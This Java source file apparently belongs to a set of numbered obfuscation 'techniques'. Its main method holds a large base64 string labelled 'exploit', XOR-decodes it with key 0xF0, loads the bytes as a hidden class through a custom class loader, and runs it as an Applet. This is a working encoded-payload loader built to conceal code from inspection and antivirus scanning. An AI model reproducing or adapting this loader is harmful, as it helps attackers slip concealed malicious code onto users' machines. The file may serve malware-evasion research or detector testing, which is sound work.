package techniques.e;

import java.applet.Applet;

public class Application {

	public static void main(String[] args) throws Exception {

		String exploit = "Og5KTvDw8MLxYPfw8vHw6ISVk5iemYGFlYPflN+xgICcmZORhJmfnvfw9PHw4pqRhpHfkYC" +
				"AnJWE37GAgJyVhPHw8oPB8fDivJqRhpHfnJGel9+jhIKZnpfL8fDyg8Lx8PKDw/Hw8oPE8fDyg8Xx8PK" +
				"DxvHw8oPH8fDyg8jx8PKDyfHw84PBwPHw4IOVgpmRnKaVgoOZn56lubTx8PG68fD9s5+eg4SRnoSmkZy" +
				"FlfXw8PDw8PDw8fHw+MyTnJmemYTO8fDz2Nmm8fD0s5+Ulffw6fHw55qRhpHfnJGel9+jhIKZnpeyhZm" +
				"clJWC+PDr8fD3g5WEo5WThfrw8fDt/PDu8O/x8PGC8fDW2LyakYaR35yRnpffo4SCmZ6Xy9m8mpGGkd+" +
				"ckZ6X36OEgpmel8v68PHw0fzw0vDv8fDxnPrw1PDW9/DV8fDgmpGGkd+ckZ6X36OEgpmel/zw1/DY8fD" +
				"3hpGchZW/lvHw1ti8mpGGkd+ckZ6X37+SmpWThMvZvJqRhpHfnJGel9+jhIKZnpfL+vDo8Nr88Nvw3PH" +
				"w9syZnpmEzvHw5di8mpGGkd+ckZ6X36OEgpmel8vZpvjw3vHw9oKZhIm9kfrw6PDA/PDB8MLx8PaRgIC" +
				"VnpTx8N3YvJqRhpHfnJGel9+jhIKZnpfL2byakYaR35yRnpffo4SCmZ6XsoWZnJSVgsv48MTx8PbQnpG" +
				"XlYL68NTwxvzwx/DI8fD7hJ+8n4eVgrORg5Xx8OTY2byakYaR35yRnpffo4SCmZ6Xy/rw1PDK/PDL8Mj" +
				"x8PSEgpmd+vDo8M388M7wyPHw+ISfo4SCmZ6X+fDx8LD88PXw9vjwsvHw8paZ+PC08fDynJX48Lbx8PL" +
				"K3/jwuPHw8t/f+fDx8Lr88Pfw9vjwvPHw84bDw/jwvvHw8cP48KDx8PGT+vDU8KL88KPwpPHw94KVgJy" +
				"Rk5Xx8LTYvJqRhpHfnJGel9+zmJGCo5WBhZWek5XLvJqRhpHfnJGel9+zmJGCo5WBhZWek5XL2byakYa" +
				"R35yRnpffo4SCmZ6Xy/jwpvHw8Yb48Kjx8PGS+PCq8fDxkfnw8fCs/PD48Pb38K7x8OCakYaR34WEmZz" +
				"fopGelJ+d+vCt8JD88Nvw5vrwrfCS/PCT8JTx8PeelYiEuZ6E8fD02LnZufjwlvHw9cS8kZ2V+PCY8fD" +
				"xxPjwmvHw85afgvjwnPHw8bz48J7x8PG++vCA8IL38IHx8OGakYaR35yRnpffsp+fnJWRnvzw1/CD8fD" +
				"m2KrZvJqRhpHfnJGel9+yn5+clZGey/nw8fCF/PD58Pb48Ifx8PSDn57e+PCJ8fDyh4T48Ivx8PHe+PC" +
				"N8fD4o4WewpybiYT48I/x8PKDn/jwcfHw8oOF+PBz8fDxwvjwdfHw9KSfn9D48Hfx8PGJ+PB58fDxmfn" +
				"w8fB7/PD68Pb48H3x8PGX+vDx8H/88GDwyPHw8ZX68NTwYvzwY/Bk8fD2k5iRgrGE8fD02LnZs/rw6PB" +
				"m/PDB8Gfx8OzYs9m8mpGGkd+ckZ6X36OEgpmel7KFmZyUlYLL+PBp8fDzhLaZ+PBr8fDynJT58PHwbfz" +
				"w+/D2+PBv8fDzkZyc+vDU8FH88FLwU/Hw+YOFkoOEgpmel/Hw5ti5udm8mpGGkd+ckZ6X36OEgpmel8v" +
				"48FXx8PHc+fDx8Ff88Pzw9vjwWfHw8pGf+vBb8F338Fzx8OOakYaR35yRnpffs5iRgpGThJWC/PBe8F/" +
				"x8PuEn6WAgJWCs5GDlfHw9Niz2bP48EHx8PSXnpmU+fDx8EP88P3w9vjwRfHw9ZyRhpHe+PBH8fD1k5y" +
				"Rnpf68NTwSfzwUvBK8fDl2LnZvJqRhpHfnJGel9+jhIKZnpfL+PBM8fDz3qOJ+PBO8fD0g4SVnfjwMPH" +
				"w8pyR+PAy8fDympH48DTx8PLemvjwNvHw8t6c+fDx8Dj88P7w9vjwOvHw9JyRhpH48Dzx8PfQ3p2VkZ6" +
				"D+PA+8fD2kaOEkYSV+PAg8fD0nZWehPjwIvHw8p2V+PAk8fDykpX48Cbx8POSlZ748Cjx8POdlZ758PH" +
				"wKvzw//D28fD/vJmelb6FnZKVgqSRkpyV8fDivJ+TkZymkYKZkZKclaSRkpyV8fD9o4SRk5u9kYCkkZK" +
				"clffwL/Hw5JqRhpHfmZ/fo5WCmZGcmYqRkpyV+vDz8JDx8PSEmJmD8fDqvISVk5iemYGFlYPflN+xgIC" +
				"cmZORhJmfnsv48BTx8POViJX68OjwFvzwF/AY8fD3gpWGlYKDlfHw69jZvJqRhpHfnJGel9+jhIKZnpe" +
				"yhZmclJWCy/Hw8YP48Bvx8PD68NTwHfzwHvAf8fD7hJ+zmJGCsYKCkYnx8PTY2auz+vBb8AH88NfwAvH" +
				"w6Niz2byakYaR35yRnpffs5iRgpGThJWCy/rw6PAE/PDB8AXx8N3YvJqRhpHfnJGel9+/kpqVk4TL2by" +
				"akYaR35yRnpffo4SCmZ6XsoWZnJSVgsvx8PaClYOFnITx8OW8mpGGkd+ckZ6X37OYkYKRk4SVgsv38An" +
				"x8PKrs/Hw1di8mpGGkd+ckZ6X36OEgpmel8vZvJqRhpHfnJGel9+znJGDg8vx8Pq1iJOVgISZn56D9/A" +
				"N8fDQmpGGkd+ckZ6X37OckYODvp+Etp+FnpS1iJOVgISZn5768A/x8ffx8PHw/5qRhpHfnJGel9+znJG" +
				"Dg/zx8vAK8fD3lp+CvpGdlfHw9JmemYT38fXx8OmakYaR34OVk4WCmYSJ36CVgp2Zg4OZn56D+vH08JD" +
				"38fjx8OuakYaR34OVk4WCmYSJ37GcnKCVgp2Zg4OZn5768ffwkPrx9PH7/PH88f3x8PORlJTx8O3YvJq" +
				"RhpHfg5WThYKZhInfoJWCnZmDg5mfnsvZpvfx//Hw7pqRhpHfg5WThYKZhInfoIKfhJWThJmfnrSfnZG" +
				"Znvfx4fHw6JqRhpHfg5WThYKZhInfs5+UlaOfhYKTlffx4/Hw/JqRhpHfnpWE36WivPrx4vDa9/Hm8fD" +
				"umpGGkd+DlZOFgpmEid+TlYKE37OVgoSZlpmTkYSV+vHg8ej88Nvx6fHwwti8mpGGkd+elYTfpaK8y6u" +
				"8mpGGkd+DlZOFgpmEid+TlYKE37OVgoSZlpmTkYSVy9mm+vH+8ev88Nvx7PHwsdi8mpGGkd+DlZOFgpm" +
				"Eid+zn5SVo5+FgpOVy7yakYaR34OVk4WCmYSJ36CVgp2Zg4OZn56zn5yclZOEmZ+ey9mm9/Hu8fDSmpG" +
				"Gkd+DlZOFgpmEid+xk5OVg4Ozn56Egp+cs5+ehJWIhPrx7fHQ/PDb8dHx8NTYq7yakYaR34OVk4WCmYS" +
				"J36CCn4SVk4SZn560n52RmZ7L2ab38dPx8OCakYaR35yRnpffv5KalZOE9/HV8fDlmpGGkd+SlZGeg9+" +
				"1iICClYODmZ+e+vHU8df88Nvx2PHwyti8mpGGkd+ckZ6X37+SmpWThMu8mpGGkd+ckZ6X36OEgpmel8u" +
				"rvJqRhpHfnJGel9+/kpqVk4TL2ab68dTx2vzx2/Dm8fD3lYiVk4WElfrx1PHd/PHe8d/x8PiXlYSmkZy" +
				"FlfHw5NjZvJqRhpHfnJGel9+/kpqVk4TL+vDx8cH88KDwCvfxw/Hw46u8mpGGkd+ckZ6X37+SmpWThMv" +
				"68A/xxfzxxvHH8fD+l5WEs5+eg4SChZOEn4Lx8MPYq7yakYaR35yRnpffs5yRg4PL2byakYaR35yRnpf" +
				"fgpWWnJWThN+zn56DhIKFk4Sfgsv68cnxy/fxyvHw7ZqRhpHfnJGel9+ClZaclZOE37OfnoOEgoWThJ+" +
				"C/PHM8c3x8PuelYe5noOEkZ6TlfHw19irvJqRhpHfnJGel9+/kpqVk4TL2byakYaR35yRnpffv5KalZO" +
				"Ey/fxz/Hw55qRhpHfnJGel9+ClZaclZOE37aZlZyU+vHO8bH88bLxs/Hw84OVhPHw19i8mpGGkd+ckZ6" +
				"X37+SmpWThMu8mpGGkd+ckZ6X37+SmpWThMvZpvrx0vG1/PG28bfx8PiXlYSznJGDg/Hw49jZvJqRhpH" +
				"fnJGel9+znJGDg8v48bnx8PSViJWT+PG78fD00IWE0PjwYPrwD/G+/PG/8aDx8PmXlYS9lYSYn5Tx8LD" +
				"YvJqRhpHfnJGel9+jhIKZnpfLq7yakYaR35yRnpffs5yRg4PL2byakYaR35yRnpffgpWWnJWThN+9lYS" +
				"Yn5TL+vGi8aT38aPx8OiakYaR35yRnpffgpWWnJWThN+9lYSYn5T88aXxpvHw9pmehp+blfHwydi8mpG" +
				"Gkd+ckZ6X37+SmpWThMurvJqRhpHfnJGel9+/kpqVk4TL2byakYaR35yRnpffv5KalZOEy/rxqPGq9/G" +
				"p8fDhmpGGkd+ckZ6X36KFnoSZnZX88avxrPHw+peVhKKFnoSZnZXx8OXY2byakYaR35yRnpffooWehJm" +
				"dlcv68ajxrvzxufGv8fDX2LyakYaR35yRnpffo4SCmZ6Xy9m8mpGGkd+ckZ6X36CCn5OVg4PL+vGR8ZP" +
				"38ZLx8OGakYaR35yRnpffoIKfk5WDg/zxlPGV8fD3h5GZhLafgvHw89jZufrxl/GZ9/GY8fDjmpGGkd+" +
				"ckZ6X36SYgp+HkZKclfzxmvDm8fD/gIKZnoSjhJGTm6SCkZOV8fDynIDx8Ou8mpGGkd+DlZOFgpmEid+" +
				"glYKdmYODmZ+eg8vx8POcgJTx8NC8mpGGkd+DlZOFgpmEid+ggp+ElZOEmZ+etJ+dkZmey/Hw9JyRk5P" +
				"x8NS8mpGGkd+DlZOFgpmEid+xk5OVg4Ozn56Egp+cs5+ehJWIhMvx8PSRgoLB8fD0lYiAwfHw57yakYa" +
				"R35KVkZ6D37WIgIKVg4OZn57L8fDhvJqRhpHfnJGel9+znJGDg8vx8PSRgoLC8fD0lYiAwvHw8oOT8fD" +
				"zk5+e8fDvvJqRhpHfnJGel9+ClZaclZOE37OfnoOEgoWThJ+Cy/Hw9IOEkYTx8OK8mpGGkd+ckZ6X37+" +
				"SmpWThMvx8PGd8fDqvJqRhpHfnJGel9+ClZaclZOE372VhJiflMvx8Pycn5ORnKCCn5OVg4Px8OO8mpG" +
				"Gkd+ckZ6X36CCn5OVg4PL8fDxhPHw5byakYaR35yRnpffpJiCn4eRkpyVy/Hw5ryfk5GcppGCmZGSnJW" +
				"kiYCVpJGSnJXx8OS8mpGGkd+ckZ6X37OckYODzNrOy/Hw9YCRmZ6E8fDm2LyakYaR35GHhN+3gpGAmJm" +
				"Tg8vZpvrxd/F59/F48fDhmpGGkd+Rh4Tft4KRgJiZk4P88Xrxe/Hw+pSCkYejhIKZnpfx8OfYvJqRhpH" +
				"fnJGel9+jhIKZnpfLubnZpvHw/YCRgpGdt4KRgJiZk4Px8OO8mpGGkd+Rh4Tft4KRgJiZk4PL8fD6o5+" +
				"FgpOVtpmclfHw4LGAgJyZk5GEmZ+e3pqRhpHw0fDx8PPw8PD78Prw9fD28PDw+vD38Pbw8PD68Pjw9vD" +
				"w8Prw+fD28PDw+vD68Pbw8PD68Pvw9vDw8Prw/PD28PDw+vD98Pbw8PD68P7w9vDw8Prw//D28PDw6vD" +
				"g8OHw8fDi8PDw8vDj8Pjw+PDl8Obw8fDn8PDypPD18PDw8PENS/DoqeLqSPDsSPDQSPDsSPDTR/DZ4t1" +
				"G8N/iw0bwxUbwyUbw30bwzEjw0EPwz0vw6KnisUfw2eKzSPDQRvDf4rVG8N/it0jw7Ebw30bwzEPwueK" +
				"74r3iv0bwoeKl4qdG8KHip+KpRvChQ/CrS/CtqUfwr/VG8JH2UvDm4pXil+KZRvCh4pvinUbwoVfw9/N" +
				"I8J8w8NRD8IRL8Oip4oZH8NlL8Oip4ohI8OxI8NNH8NniqUbw30bwzEjw7Ebw3+KKRvDf4oxG8N9G8Mz" +
				"ijuJwRvCh4nLidEbwyUbwoeJ24nhG8KFD8HpL8Oip4nxH8NlI8H7zRvBhRvBl4mhG8N9I8H71RvBhRvB" +
				"l4mpG8N9G8MxD8GxL8Oip4r9H8NnibvP1RvBQRvDfQvCr9EbwYUbwZeJU4lTiikbwoUbw30jwfkbw30b" +
				"wzEPwVkvw6KlL8Oip4lhH8NngnEjwWkbwZUbwzEjw7Ejw00fw2eJASPDsRvDfRvDMQ/BCS/DoqUvw6Kn" +
				"iREfw2eJG9EbwSEbw30bwzEjw0Ejw00fw2eJLRvDf4k1I8OxI8OxG8N9G8MziT+IxRvCh4jPiNUbwoUP" +
				"wN0vw6KniOUfw2eI7RvDJRvDf4opG8N/iPfRG8EhG8N/iP0bw30bwzOJP4jFG8KHiIeIjRvCh4iXiJ0b" +
				"woUPwKUHw8PDz8Cvw8PDe8Pvw8PDk8N7w5fCi8ObwnPDn8Gjw6PAW8Onx4/Dq8bjw6/GH8OzxTfDt8Qz" +
				"w3/As8PDw8vDw8C3w8PD58PIL8H6z9/Au8PHw2/Dm8PHw5/Dw8N/w8fDx8PDw9dpH8BBB8PDw8vAr8PD" +
				"w9vDx8PDw4vAs8PDw/PDx8PDw9fAR8BLw8PD68GDwyPDx8Ofw8PDT8PHw8PDw8PPiE0Dw8PDy8Cvw8PD" +
				"28PHw8PDQ8Czw8PDy8PDw+vDu8O/w8fDn8PDwyfDz8PHw8PD/S/DoqdpH8NlG8BVG8MxA8PDw8vAr8PD" +
				"w9vDx8PDw1PAs8PDw/PDx8PDw//AZ8Pbw8PD68NLw7/Dx8Ofw8PBY8PPw9vDw8M7iGrzaRvAcqcr1Tsb" +
				"0885X8NHp9e3ESPAAvUvw6KnbSPDTR/DZ3EbwA0bwzLx08/Ht5fRRDy/bSPDsSPDsQPDw8PPwK/Dw8Ob" +
				"w9fDw8Njw8/DZ8Orw2vDd8NnwxvDc8Czw8PDQ8PPw8PDO8Bnw9vDw8PPwy/AG8Pbw8fDq8OPwoPAH8PL" +
				"wLfDw8Obw8g/w4vD29/DU9/DU8PHx9/AI8PDt8PnwoPAK8PLwC/Dw8PTw8fAM8Ofw8PDf8PHw8fDw8PX" +
				"aSPAOQPDw8PLwK/Dw8Pbw8fDw8MLwLPDw8Pzw8fDw8PXwGfD28PDw8fHz8Obw8fDn8PDyjfD38P7w8PH" +
				"OS/H0qUfx9rzbS/H3qUfx+Ubx+kvx/qlL8eCpS/HiqULwuUfx5PNN8eVH8efbR/HqvUvx7an0TfH+qfP" +
				"co0fx7770TfHSqfNC8HqjyvRL8dSp4g9C8ITp9Efx1sr16fVG8dnp9Ubx3DDwD8r29U3x0sr36ffzQvA" +
				"pSPHAo+n39ELwq6NL8dSp6fZC8Gzp90fx1sr46fhG8dlC8ClI8cDK+en59k3wD6nz4/HSo6n04tSjqfX" +
				"j8cKjRvHEyvrp+vZN8dKp80LwN0jxwKOp9ELwz6Op9fRN8dKjRvHIyvvp+Ebx3DDxzun73UbxsOn7RvG" +
				"0S/DoqePxuEfw2ePxukbwyUbw3+PxvEbw30bwzPNN8A9G8b3K/On86fvzTfHSRvGhp/HK/Ujxp0LwVkb" +
				"xrcr96f1G8ZCnV/D4vNtG8ZZB8PHw8PHF8cjxl/D08Cvw8PCW8Onw8PDI8PjwyfDj8MrwwfDL8LHwzPC" +
				"98M3wrfDO8JLwz/Cc8LDwgvCx8IzwsvBz8LPwY/C08GjwtvBQ8LfwTPC48C3wufAb8Lrx5fC78dHwvfH" +
				"U8L7x3/C/8cXwoPHJ8KHxzfCj8Czw8PBo8P/w8PHO8BHwEvDw8Pjx3fGb8Zzw8fDB8fTxnfGe8PLwsfA" +
				"E8Z/xgPDz8L3wGPGB8cPw9PCt8CjxgvGD8PXwnPA58KDxhPD28ILwM/GF8cPw9/Bj8FLxhvGD8PjwUPB" +
				"l8YfxhPD58EzwifGI8Ynw+vAt8KjxivGL8Pvx5fDQ8YzxjfD88dTw4fGO8Y/w/fHJ8PTxcPFx8PHxcvD" +
				"w8Pzw8fCc8DnwoPFz8PbwLfDw8Pnw8gfxyPfxl/Tw8fF08XXw8fDn8PDwtPD08PLw8PD820LwQuDC4Ol" +
				"G8XZB8PDw8vAr8PDw+vDy8PDwp/D78KjwLPDw8Obw8vDw8PzwEfAS8PDw8PD88XzxffDx8PHxfvDw8PLxfw==";

		final byte[] b = base64Decode(exploit);

		byte key = (byte) 0xF0;
		for (int i = 0; i < b.length; i++) {
			b[i] = (byte) (b[i] ^ key);
		}

		class ByteArrayClassLoader extends ClassLoader {
			public Class<?> findClass(String name) {
				return defineClass(name, b, 0, b.length);
			}
		}

		Class<?> c = new ByteArrayClassLoader().findClass("techniques.d.Application");
		Applet a = (Applet) c.getConstructors()[0].newInstance(null);
		a.init();
	}

	private final static char[] ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".toCharArray();

	private static int[] toInt = new int[128];

	static {
		for (int i = 0; i < ALPHABET.length; i++) {
			toInt[ALPHABET[i]] = i;
		}
	}

	public static byte[] base64Decode(String s) {
		int delta = s.endsWith("==") ? 2 : s.endsWith("=") ? 1 : 0;
		byte[] buffer = new byte[s.length() * 3 / 4 - delta];
		int mask = 0xFF;
		int index = 0;
		for (int i = 0; i < s.length(); i += 4) {
			int c0 = toInt[s.charAt(i)];
			int c1 = toInt[s.charAt(i + 1)];
			buffer[index++] = (byte) (((c0 << 2) | (c1 >> 4)) & mask);
			if (index >= buffer.length) {
				return buffer;
			}
			int c2 = toInt[s.charAt(i + 2)];
			buffer[index++] = (byte) (((c1 << 4) | (c2 >> 2)) & mask);
			if (index >= buffer.length) {
				return buffer;
			}
			int c3 = toInt[s.charAt(i + 3)];
			buffer[index++] = (byte) (((c2 << 6) | c3) & mask);
		}
		return buffer;
	}

}
